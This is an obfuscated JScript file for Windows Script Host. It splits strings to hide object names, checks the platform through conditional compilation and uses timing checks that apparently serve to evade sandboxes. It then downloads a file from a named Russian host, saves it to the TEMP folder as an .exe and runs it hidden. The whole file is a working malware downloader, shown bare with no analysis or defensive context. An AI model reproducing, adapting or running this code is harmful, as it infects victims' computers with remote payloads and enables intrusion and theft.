var T = false;
var G = "Create"+"Object";
var HZ = function BX() {return WScript[G]("WScript"+".Shell");}(), Q = 11;
var QN = "MSXML2"+".XMLHTTP";
var VW0 = 2;
var S = VW0 - 2;
function L0(A){HZ["Run"](A, S, S);};
function X(){return QN + "";};
function Y0(Q0, KW){S = S * 1; return Q0 - KW;};
function TN(){return G;};
/*@cc_on
  @if (@_win32 || @_win64)
    T = true;
  @end
@*/
if (T)
{
var RY = "";
function L(){return 22;};
var XN = 0; var KE = 0;
function FU()
{
var N = new this["Date"]();
var VW = N["getUTCMilliseconds"]();
WScript["Sleep"](L());
var N = new this["Date"]();
var X0 = N["getUTCMilliseconds"]();
WScript["Sleep"](L());
var N = new this["Date"]();
var H = N["getUTCMilliseconds"]();
var XN = "U";
XN = Y0(X0, VW);
var KE = "O";
KE = Y0(H, X0);
RY = "open";
return Y0(XN, KE);
}
var KI = false;
var G0 = false;
for (var J = S; J < L() * 1; J++){if (FU() != S){
KI = true; 
KE = "31" + 11 * XN + KE; 
G0 = true; 
break;
}}
function R() {return ((KI == true) && (KI == G0)) ? 1 : S;};
if (KI && R() && G0){
function Y() {return HZ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "d22quNTYqRj.ex" + "e";};
 ST = X();
 EN = WScript[G](ST);
 var V = 1;
do { 
	for (;V;){
	try {
		if (V == 1)
		{
			EN[RY]("GET", "http://bigmishki.ru/l3osjf", false);
			EN["send"]();
			ZN = "Sleep";
			V = 2;
		}
		WScript[ZN](L() + 120); 
		if (EN["readystate"] < 2 * 2) continue;
		V = S;
		function QF(LL) {var UW = (1, 2, 3, 4, 5, LL); return UW;};
		UN = WScript[TN()]("ADODB.Stream");
		ST = UN;
		ST[RY]();
		ST["type"] = QF(1);
		ST["write"](EN["ResponseBody"]);
		UN["position"] = QF(S);
		ST["Save" + "ToFile"](Y(), 2);
		UN["cl"+"ose"]();
		EP = Y();
		L0(EP);
	} catch(HA){};};
}while (V);
}
}

